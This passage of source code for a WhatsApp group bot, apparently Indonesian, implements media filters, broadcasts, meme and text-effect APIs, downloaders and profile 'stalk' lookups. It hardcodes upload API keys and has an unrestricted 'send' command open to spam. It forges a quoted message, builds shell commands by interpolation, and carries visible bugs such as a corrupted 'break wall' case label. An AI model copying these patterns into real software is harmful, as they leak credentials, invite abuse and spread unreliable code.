						zaki.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
					break                                                  
case 'imut':
					encmedias = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zaki.downloadAndSaveMediaMessage(encmedias)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zaki.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
				fs.unlinkSync(ran)
				})
				break                                                  
case 'nightcore':
	                 if (!isRegister) return reply('reply audio nya om')
					encmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaajeo = await zaki.downloadAndSaveMediaMessage(encmediap)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaajeo} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaajeo)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zaki.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:99999999999999999999999})
						fs.unlinkSync(ran)
					   })
				  break                                                   
//end Audio
				case 'listadmins':
				case 'adminlist':
					zaki.updatePresence(from, Presence.composing) 
                                        if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroup) return fakeimage(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break                                                  
				case 'pokemon':
                    zaki.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=pokemon`, {method: 'get'})
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					reply (mess.wait)
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zaki.sendMessage(from, pok, image, { quoted: mek })
                                        await limitAdd(sender)
					break                                                  
case 'addprem':

					if (!isOwner) return reply(ind.ownerb())

					adprem = `${args[0].replace('@', '')}@s.whatsapp.net`
					premium.push(adprem)
					fs.writeFileSync('./database/json/premium.json', JSON.stringify(premium))
					reply(`BERHASIL MENAMBAHKAN USER PREMIUM`)
					break                                                  

				 case 'unpremium':
				 case 'delprem':
        if (!isOwner) return reply(ind.ownerb())
        premm = body.slice(11)
        premium.splice(`${premm}@s.whatsapp.net`, 1)
        fs.writeFileSync('./database/json/premium.json', JSON.stringify(prem))
        reply(`Nomor sudah berakhir menjadi premium wa.me/${premm} `)
        break                                                  
					
                case 'premiumlist':
				zaki.updatePresence(from, Presence.composing) 
					
					if (!isRegister) return reply(mess.only.daftarB)
				pemlist = '╭──「 *USER PREMIUM* 」\n'
				for (let premm of premium) {
					pemlist += `> @${premm.split('@')[0]}\n`
					}
					pemlist += `Total : ${premium.length}`
				zaki.sendMessage(from, pemlist.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": premium}})
				break                                                  
        case 'upswtext':
					zaki.updatePresence(from, Presence.composing)
					zaki.sendMessage('status@broadcast', `${q}`, extendedText)
					zaki.sendMessage(from, `Sukses Up story wea teks ${q}`, text,{quoted : mek})
					break                                                  
					
				case 'upswimg':
					zaki.updatePresence(from, Presence.composing)
					if (isQuotedImage) {
						const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						cihcih = await zaki.downloadMediaMessage(swsw)
						zaki.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Image dengan Caption: ${q}`
					zaki.sendMessage(from, bur, text, { quoted: mek })
					break                                                  
					
				case 'upswvideo':
					zaki.updatePresence(from, Presence.composing)
					if (isQuotedVideo) {
						const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						cihcih = await zaki.downloadMediaMessage(swsw)
						zaki.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Video dengan Caption: ${q}`
					zaki.sendMessage(from, bur, text, { quoted: mek })
					break                                                  
				case 'setmemlimit':

					if (args.length < 1) return

					if (!isOwner) return reply(ind.ownerb())
					if (isNaN(args[0])) return reply('Limit harus angka')
					memberlimit = args[0]
					reply(`Change Member limit To ${memberlimit} SUCCESS!`)
					break                                                  
				case 'memeindo':
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					anu = await fetchJson(`http://zekais-api.herokuapp.com/memeindo`)
					buffer = await getBuffer(anu.result)
					zaki.sendMessage(from, buffer, image, {quoted: mek})
					break                                                  
				case 'darkjokes':
                                        if (!isRegister) return reply(mess.only.daftarB)
                                        if (isLimit(sender)) return reply(ind.limitend(pushname))
					gatauda = body.slice(8)					
					anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=${apizeks}`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					zaki.sendMessage(from, buffer, image,{quoted: {"key":{"remoteJid":"grup@broadcast","fromMe":false,"id":"FBCE17736329A9CC8E3145BBB7465EB0"},"message":{"extendedTextMessage":{"text":"*STIKER NIH*","previewType":"NONE","contextInfo":{"stanzaId":"834BA0857AD7632F2198291B6EC1E5FF","participant":"0@s.whatsapp.net","quotedMessage":{"stickerMessage":{"url":"https://mmg.whatsapp.net/d/f/ArhEBIE1yQEYW4zNTFJ4JI6CRhJshL1OpPu3iPcP29dv.enc","fileSha256":"yi6tqxZ2L3FVYowW0hZtHKkdQdKo160nTeSTKmlc3bE=","fileEncSha256":"xiJHSKy7cv7WU5GYnxy9uxcVQg9YuThHym+qk6ohqt8=","mediaKey":"j+kzdjkwHcmhK/IiEzTJZQk4V+2hSzwHwYKCAbXHZgw=","mimetype":"image/webp","height":64,"width":64,"directPath":"/v/t62.15575-24/31575419_439698240636255_2474534567126333610_n.enc?oh=193bd6a34b685209e5d965c86cf85786&oe=606DD417","fileLength":"13256","mediaKeyTimestamp":"1615170980","jpegThumbnail": fs.readFileSync('./temp/image/tahta.jpeg')
					} 
				}
			} 
		}
	}
} })
                                        await limitAdd(sender)
					break                                                  		
				case 'block':
					zaki.updatePresence(from, Presence.composing) 
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isOwner) return reply(ind.ownerB())
					zaki.blockUser (`${body.slice(8)}@c.us`, "add")
					zaki.sendMessage(from, `perintah Diterima, memblokir ${body.slice(8)}@c.us`, text)
					break                                                  
				case 'hilih':
					zaki.updatePresence(from, Presence.composing) 
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/hilih?teks=${body.slice(7)}`, {method: 'get'})
					reply(anu.result)
					break                                                  
				case 'tagall':
				        zaki.updatePresence(from, Presence.composing) 
					if (!isGroup) return fakeimage(mess.only.group)
                                        if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `  Total : ${groupMembers.length}\n`
					for (let mem of groupMembers) {
						teks += `➪ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions('TAGAll\n➪'+teks+'Success', members_id, true)
					break                                                  
         
				case 'send':
					var pc = body.slice(6)
					var nomor = pc.split("|")[0];
					var pesan = pc.split("|")[1];
					zaki.sendMessage(nomor+'@s.whatsapp.net', pesan, text)
					break                                                  
				
				case 'asupan':
         if (!isRegister) return reply(mess.only.daftarB)
			 	if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				reply(ind.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asupan?apikey=${lolKey}`)
                    ini_buffer = await getBuffer(get_result.result)
                    zaki.sendMessage(from, ini_buffer, video, { quoted: mek, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    break                                                  
case 'deteksiwajah':  
                    if (!isRegister) return reply(mess.only.daftarB)		 
	               	var imgbb = require('imgbb-uploader')
	               	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	             	ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	              	reply(mess.wait)
		            owgi = await zaki.downloadAndSaveMediaMessage(ted)
		            anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
	             	hehe = await getBuffer(`http://lolhuman.herokuapp.com/api/facedetect?apikey=${lolKey}&img=${anu.display_url}`)
                  	zaki.sendMessage(from, hehe, image, {quoted:mek})
		            } else {
		            reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
	              	}
	                break                                                  
	            	case 'removebg':  
                    if (!isRegister) return reply(mess.only.daftarB)		 
                   	var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply(mess.wait)
	                owgi = await zaki.downloadAndSaveMediaMessage(ted)
	                anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
	                hehe = await getBuffer(`http://api.lolhuman.xyz/api/removebg?apikey=${lolKey}&img=${anu.display_url}`)
	                zaki.sendMessage(from, hehe, image, {quoted:mek})
                	} else {
	                reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
                	}
	                break                                                  	 
	                case 'deteksiumur':  
                    if (!isRegister) return reply(mess.only.daftarB)	 
	                var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply(mess.wait)
	                owgi = await zaki.downloadAndSaveMediaMessage(ted)
	                anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
                  	hehe = await fetchJson(`http://lolhuman.herokuapp.com/api/agedetect?apikey=${lolKey}&img=${anu.display_url}`)
                  	gender = `[ DETEKSI UMUR ] \nMenurut bot.. seseorang di gambar tersebut berumur = *${hehe.result}*`
	                zaki.sendMessage(from, gender, text, {quoted:mek})
                 	} else {
                  	reply(`KIRIM FOTO DENGAN CAPTION ${command}`)
                	}
	                break                                                  
					case 'quotesnime':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    anu = await fetchJson(`https://videfikri.com/api/anime/randomquoteanime`)
                    anu1 = `➻ *ANIME* : ${anu.result.anime}\n`
                    anu1 += `➻ *KARAKTER* : ${anu.result.character}\n`
                    anu1 += `➻ *QUOTES* : ${anu.result.quotes}\n`
                    zaki.sendMessage(from, anu1, text, {quoted: mek})
                    break                                                  
				case 'setppbot':
				zaki.updatePresence(from, Presence.composing) 
				if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					if (!isOwner) return reply(ind.ownerB())
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zaki.downloadAndSaveMediaMessage(enmedia)
					await zaki.updateProfilePicture(botNumber, media)
					reply('Makasih profile barunya')
					break                                                  
				case 'bc':
					zaki.updatePresence(from, Presence.composing) 
					if (!isOwner) return reply(ind.ownerB())
					if (args.length < 1) return reply('.......')
					anu = await zaki.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmediaq = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await zaki.downloadMediaMessage(encmediaq)
						for (let _ of anu) {
							zaki.sendMessage(_.jid, buff, image, {caption: `*「 BROADCAST 」*\n\n${body.slice(4)}`})
						}
						reply('')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 BROADCAST 」*\n\n${body.slice(4)}`)
						}
						reply('Suksess broadcast')
					}
					break                                                  
					case 'bcgc':
					zaki.updatePresence(from, Presence.composing) 
					if (!isOwner) return reply(ind.ownerB())
					if (args.length < 1) return reply('.......')
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmediaw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await zaki.downloadMediaMessage(encmediaw)
						for (let _ of groupMembers) {
							zaki.sendMessage(_.jid, buff, image, {caption: `*「 BC GROUP 」*\n*Group* : ${groupName}\n\n${body.slice(6)}`})
						}
						reply('')
					} else {
						for (let _ of groupMembers) {
							sendMess(_.jid, `*「 BC GROUP 」*\n*Group* : ${groupName}\n\n${body.slice(6)}`)
						}
						reply('Suksess broadcast group')
					}
					break                                                  
				case 'alay':
                    zaki.updatePresence(from, Presence.composing) 
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (isLimit(sender)) return reply(ind.limitend(pushname))
                    data = await fetchJson(`https://arugaz.my.id/api/edu/corona?country=indonesia}`)
                    reply(data.result)
                    await limitAdd(sender)
                    break                                                  
                    case 'quotemaker':
                    gh = body.slice(12)
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (isLimit(sender)) return reply(ind.limitend(pushname))
                    teks1 = gh.split("|")[0];
                    teks2 = gh.split("|")[1];
                    teks3 = gh.split("|")[2]
                    data = await fetchJson(`https://terhambar.com/aw/qts/?kata=${teks1}&author=${teks2}&tipe=${teks3}`)
                    buffer = await getBuffer(data.result)
                    zaki.sendMessage(from, buffer, image, {quoted: mek, caption: 'neh...'})
                    await limitAdd(sender)
                    break                                                  
                    case 'glitch':
                    gh = body.slice(7)
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (isLimit(sender)) return reply(ind.limitend(pushname))
                    teks1 = gh.split("|")[0];
                    teks2 = gh.split("|")[1];
                    data = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=glitch&text1=${teks1}&text2=${teks2}&apikey=${apitobz}`, {method: 'get'})
                    hasil = await getBuffer(data.result)
                    zaki.sendMessage(from, hasil, image, {quoted: mek, caption: 'neh...'})
                    await limitAdd(sender)
                    break                                                  
  case 'tolol':
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))

        if (args.length < 1) return reply('Teks nya mana?')
        gatauda = body.slice(6)
        reply(ind.wait)
        buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/toloserti?apikey=${lolKey}&name=${gatauda}`, {
          method: 'get'
        })
        zaki.sendMessage(from, buffer, image, {
          quoted: mek})
        await limitAdd(sender)
        
        break                                                  

      case 'shadow2':
      case 'cup':
      case 'cup2':
      case 'romance2':
      case 'smoke':
      case 'burnpaper':
      case 'lovemessage':
      case 'undergrass':
      case 'love':
      case 'coffe':
      case 'woodheart':
      case 'flowerheart':
      case 'woodenboard':
      case 'summer3d':
      case 'wolfmetal':
      case 'nature3d':
      case 'underwater':
      case 'golderrose':
      case 'summernature':
      case 'letterleaves':
      case 'glowingneon':
      case 'falleaves':
      case 'flamming':
      case 'potter':
      case 'carvedwood': // Fix Bug By MancaBot & Nurul
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        if (args.length == 0) return reply('Teksnya Mana Kak?')
        reply(ind.wait)
        txt = args.join(" ")
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolKey}&text=${txt}`)
        zaki.sendMessage(from, buffer, image, {
          caption: 'Nih kak....\n\n*Follow!!* : @ahmadzaki_yo\n\nJangan Pake Nya Doang!!',
          quoted: mek
        })
        break                                                  
      case 'wetglass':
      case 'multicolor3d':
      case 'watercolor':
      case 'luxurygold':
      case 'galaxywallpaper':
      case 'lighttext':
      case 'beautifulflower':
      case 'puppycute':
      case 'royaltext':
      case 'heartshaped':
      case 'birthdaycake':
      case 'galaxystyle':
      case 'hologram3d':
      case 'greenneon':
      case 'glossychrome':
      case 'greenbush':
      case 'metallogo':
      case 'noeltext':
      case 'glittergold':
      case 'textcake':
      case 'starsnight':
      case 'wooden3d':
      case 'textbyname':
      case 'writegalacy':
      case 'galaxybat':
      case 'snow3d':
      case 'birthdayday':
      case 'gplybutton':
      case 'splybutton':
      case 'epep': // Fix Bug By MancaBot & Nurul*
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        if (args.length == 0) return reply('Teksnya Mana Kak')
        reply(ind.wait)
        txt = args.join(" ")
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolKey}&text=${txt}`)
        zaki.sendMessage(from, buffer, image, {
          caption: 'Nih kak....\n\n*Follow!!* : @ahmadzaki_yo\n\nJangan Pake Nya Doang!!',
          quoted: mek
        })
        break                                                  
      case 'blackpink':
      case 'neon':
      case 'greenneon':
      case 'advanceglow':
      case 'futureneon':
      case 'sandwriting':
      case 'sandsummer':
      case 'sandengraved':
      case 'metaldark':
      case 'neonlight':
      case 'holographic':
      case 'text1917':
      case 'minion':
      case 'deluxesilver':
      case 'newyearcard':
      case 'bloodfrosted':
      case 'halloween':
      case 'jokerlogo':
      case 'fireworksparkle':
      case 'natureleaves':
      case 'bokeh':
      case 'toxic':
      case 'strawberry':
      case 'box3d':
      case 'roadwarning':
      case 'break                                                  wall':
      case 'icecold':
      case 'luxury':
      case 'cloud':
      case 'summersand':
      case 'horrorblood':
      case 'thunder2':
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} Hans`)
        txt = args.join(" ")
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolKey}&text=${txt}`)
        zaki.sendMessage(from, buffer, image, {
          caption: 'Nih kak....\n\n*Follow!!* : @ahmadzaki_yo\n\nJangan Pake Nya Doang!!',
          quoted: mek
        })
        break                                                  

				 case 'chord':
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (args.length < 1) return reply('Judul lagunya mana kak')
        tels = body.slice(7)
        anu = await fetchJson(`https://tobz-api.herokuapp.com/api/chord?q=${tels}&apikey=${apitobz}`, {
          method: 'get'
        })
        reply(anu.result)
        await limitAdd(sender)
        break                                                  
             case 'stalkig':
             case 'igstalk':
            if (!q) return reply('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break                                                  
case 'stalktwit':                      	  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply('MASUKKAN USERNAME') 
					reply (mess.wait) 
                    anu = await fetchJson(`https://videfikri.com/api/stalktwit/?username=${args[0]}`, {method: 'get'})
                    anu1 = await getBuffer(anu.result.profile)
                    anu2 = `➻ *NAMA* : ${anu.result.full_name}\n`
                    anu2 += `➻ *USER* : ${anu.result.username}\n`
                    anu2 += `➻ *FOLLOWERS* : ${anu.result.followers}\n`
                    anu2 += `➻ *FOLLOWING* : ${anu.result.following}\n`
                    anu2 += `➻ *TWEETS* : ${anu.result.tweets}\n`
                    anu2 += `➻ *PUBLIC* : ${anu.result.verified}\n`
                    anu2 += `➻ *LIST* : ${anu.result.listed_count}\n`
                    anu2 += `➻ *FAVOURIT* : ${anu.result.favourites}\n`
                    anu2 += `➻ *JOIN* : ${anu.result.joined_on}\n`
                    zaki.sendMessage(from, anu1, image,{caption: anu2, quoted: mek})
                    break                                                  
                    case 'stalkgithub':              
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply('MASUKKAN USERNAME') 
					reply (mess.wait)
                    anu = await fetchJson(`http://zekais-api.herokuapp.com/github?user=${args[0]}`, {method: 'get'})
                    anu1 = await getBuffer(anu.result.profile_pic)                           
                    anu2 = `➻ *NAMA* : ${anu.result.name}\n`
                    anu2 += `➻ *ID* : ${anu.result.id}\n`
                    anu2 += `➻ *COMPANY* : ${anu.result.company}\n`
                    anu2 += `➻ *BLOG* : ${anu.result.blog}\n`
                    anu2 += `➻ *LOCATION* : ${anu.result.location}\n`
                    anu2 += `➻ *EMAIL* : ${anu.result.email}\n`
                    anu2 += `➻ *HIRABLE* : ${anu.result.hireable}\n`
                    anu2 += `➻ *BIOGRAFI* : ${anu.result.biografi}\n`
                    anu2 += `➻ *PUBLIC1* : ${anu.result.public_repository}\n`
                    anu2 += `➻ *PUBLIC2* : ${anu.result.public_gists}\n`
                    anu2 += `➻ *FOLLOWERS* : ${anu.result.followers}\n`
                    anu2 += `➻ *FOLLOWING* : ${anu.result.following}\n`
                    anu2 += `➻ *JOIN* : ${anu.result.joined_on}\n`
                    anu2 += `➻ *UPDATE* : ${anu.result.last_updated}\n`
                    anu2 += `➻ *URL* : ${anu.result.profile_url}\n`
                    zaki.sendMessage(from, anu1, image,{caption: anu2, quoted: mek})
                    break                                                  
                    case 'steam':                      	  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply('MASUKKAN JUDUL') 
					reply (mess.wait)
                    anu = await fetchJson(`https://videfikri.com/api/steam/?username=${args[0]}`, {method: 'get'})
                    anu1 = `➻ *NAMA* : ${anu.result.name}\n`
                    anu1 += `➻ *USER* : ${anu.result.username}\n`
                    anu1 += `➻ *COUNTRY* : ${anu.result.country}\n`
                    anu1 += `➻ *IMG* : ${anu.result.image}\n`
                    anu1 += `➻ *LEVEL* : ${anu.result.level}\n`
                    anu1 += `➻ *FACEIT* : ${anu.result.faceit}\n`
                    anu1 += `➻ *BADGES* : ${anu.result.badges}\n`
                    anu1 += `➻ *MENTS* : ${anu.result.achievements}\n`
                    anu1 += `➻ *ON* : ${anu.result.onkah}\n`
                    zaki.sendMessage(from, anu1, text,{quoted: mek})
                    break                                                   
                     case 'drivevid':
case 'gdrivev':
case 'gdrive':
if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pusname, prefix))
        if (isBanned) return reply(ind.baned())
        if (args.length < 1) return reply('Contoh : ${prefix + command} https://drive.google.com/uc?id=1lBYJ0I-qJH9IsbCid-AsZosepX4-UJet&export=download') 
        reply(ind.wait)
url = body.slice(10) 
hans = await fetchJson(`https://api.zeks.xyz/api/gdbypass?apikey=${apizeks}&url=${url}`) 
teks = `Filename : ${hans.data.file_name} \n\nSupport *HLX BOT* Dengan Follow ;\nInstagram.com/ahmadzaki_yo`
buper = await getBuffer(hans.result.direct_download) 
zaki.sendMessage(from, buper, video, {
          mimetype: 'video/mp4',
          filename: `hlxbot.mp4`,
          quoted: mek,
          caption: teks
        })
        await limitAdd(sender)
        break
        
        case 'gdrivev':
case 'gdrive':
if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pusname, prefix))
        if (isBanned) return reply(ind.baned())
        if (args.length < 1) return reply('Contoh : ${prefix + command} https://drive.google.com/uc?id=1lBYJ0I-qJH9IsbCid-AsZosepX4-UJet&export=download') 
        reply(ind.wait)
url = body.slice(10) 
hans = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=&url=${url}`) 
teks = `Filename : ${hans.data.file_name} \n\nSupport *HLX BOT* Dengan Follow ;\nInstagram.com/ahmadzaki_yo`
buper = await getBuffer(hans.result.direct_download) 
zaki.sendMessage(from, buper, video, {
          mimetype: 'video/mp4',
          filename: `hlxbot.mp4`,
          quoted: mek,
          caption: teks
        })
        await limitAdd(sender)
        break
        
        case 'fbdl':
case 'fb':
if (!isRegister) return reply(ind.noregis())
        if (isLimit(sender)) return reply(ind.limitend(pusname, prefix))
        if (isBanned) return reply(ind.baned())
        if (args.length < 1) return reply(`Contoh : ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
        reply(ind.wait)
url = body.slice(6) 
hans = await fetchJson(`https://api.lolhuman.xyz/api/facebook2?apikey=${lolKey}&url=${url}`)
teks = `Support *HLX BOT* Dengan Follow :\nInstagram.com/ahmadzaki_yo`
buper = await getBuffer(hans.result) 
zaki.sendMessage(from, buper, video, {
          mimetype: 'video/mp4',
          quoted: mek,
          caption: teks
        })
        await limitAdd(sender)
        break                                                  
      case 'igdl':
case 'ig':
case 'igvid':
if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pusname, prefix))
        if (isBanned) return reply(ind.baned())
        reply(ind.wait)
        if (args.length < 1) return reply('Contoh : #igdl https://www.instagram.com/p/CIk47s2FMl4/') 
url = body.slice(6) 
hans = await fetchJson(`https://api.zeks.xyz/api/ig?apikey=${apizeks}&url=${url}`) 
teks = `Caption : ${hans.result.caption} \n\nSupport *HLX BOT* Dengan Follow :\nInstagram.com/ahmadzaki_yo`
buffer = await getBuffer(hans.result.url) 
zaki.sendMessage(from, buffer, video, {
          mimetype: 'video/mp4',
          filename: `hlxbot.mp4`,
          quoted: mek,
          caption: teks
        })
        await limitAdd(sender)
        break                                                  

      case 'tiktok':
case 'ttdl':
case 'tt':
if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pusname, prefix))
        if (isBanned) return reply(ind.baned())
        if (args.length < 1) return reply(`Contoh : ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
        reply(ind.wait)
url = body.slice(8) 
hans = await fetchJson(`https://api.lolhuman.xyz/api/tiktok3?apikey=${lolKey}&url=${url}`) 
teks = `Support *HLX BOT* Dengan Follow :\nInstagram.com/ahmadzaki_yo`
buper = await getBuffer(hans.result) 
zaki.sendMessage(from, buper, video, {
          mimetype: 'video/mp4',
          quoted: mek,
          caption: teks
        })
        await limitAdd(sender)
        break                                                  

      case 'tiktokaudio':
case 'ttaudio':
case 'tt':
if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pusname, prefix))
        if (isBanned) return reply(ind.baned())
        if (args.length < 1) return reply(`Contoh : ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
        reply(ind.wait)
url = body.slice(13) 
hans = await fetchJson(`https://api.lolhuman.xyz/api/tiktok3?apikey=${lolKey}&url=${url}`) 
teks = `Support *HLX BOT* Dengan Follow :\nInstagram.com/ahmadzaki_yo`
buper = await getBuffer(hans.result) 
zaki.sendMessage(from, buper, audio, {
          mimetype: 'audio/mp3',
          quoted: mek
        })
        await limitAdd(sender)
        break                                                  
                    case 'ownergrup':
				  case 'ownergroup':
               zaki.updatePresence(from, Presence.composing) 
              options = {
          text: `Owner Group ini adalah : @${from.split("-")[0]}`,
          contextInfo: { mentionedJid: [from] }
           }
           zaki.sendMessage(from, options, text, { quoted: mek } )
			   break                                                   
				//stickermenu
				case 'triggered':
					case 'ger':
 if (!isRegister) return reply(mess.only.daftarB)
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           reply (mess.wait)
         owgi = await zaki.downloadAndSaveMediaMessage(ger)
           anu = await imgbb("65e797d652e2a71da496e95915f0058b", owgi)
        teks = `${anu.display_url}`
         ranp = getRandom('.gif')
        rano = getRandom('.webp')
        anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
       exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                                                fs.unlinkSync(ranp)
                                                if (err) return reply(mess.error.stick)
                                                nobg = fs.readFileSync(rano)
                                                zaki.sendMessage(from, nobg, sticker, {quoted: mek})
                                                fs.unlinkSync(rano)
                                        })
                                    
                                             } else {
                                                 reply('Gunakan foto!')
                                          }
                                             break                                                  
  case 'setthum':  
                    
					if (!isOwner) return reply(`lu owner?`) 
	    	        boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
			        delb = await zaki.downloadMediaMessage(boij)
			        fs.writeFileSync('./temp/image/HLXB.jpeg', delb)
		            reply('Sukses')
			        break                                                  
case'setmek':
     
					if (!isOwner) return reply(`lu owner?`) 
	    	        boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
			        delb = await zaki.downloadMediaMessage(boij)
			        fs.writeFileSync('./temp/image/tahta.jpeg', delb)
		            reply('Sukses')
			        break                                                  
          case 'tourl':
 if (!isRegister) return reply(mess.only.daftarB)
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           reply (mess.wait)
         owgi = await zaki.downloadAndSaveMediaMessage(ger)
           anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
        teks = `${anu.display_url}`
reply(teks)
}
break                                                  
//BERITA MENU
case 'beritahoax':
				if (!isRegister) return reply(ind.noregis())
